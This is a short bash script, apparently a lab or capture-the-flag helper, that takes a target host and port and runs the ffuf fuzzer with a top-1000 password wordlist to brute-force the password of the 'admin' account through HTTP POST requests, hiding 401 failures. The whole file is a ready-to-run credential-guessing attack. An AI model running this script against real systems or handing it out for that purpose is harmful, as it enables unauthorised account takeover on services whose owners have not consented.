#!/usr/bin/env bash
if [ "${#}" -eq 2 ]; then
	TARGET="${1}"
    PORT="${2}"
    /tmp/ffuf -w /tmp/Pwdb_top-1000.txt -X POST -d "username=admin\&password=FUZZ" -u http://"${TARGET}:${PORT}" -fc 401
fi
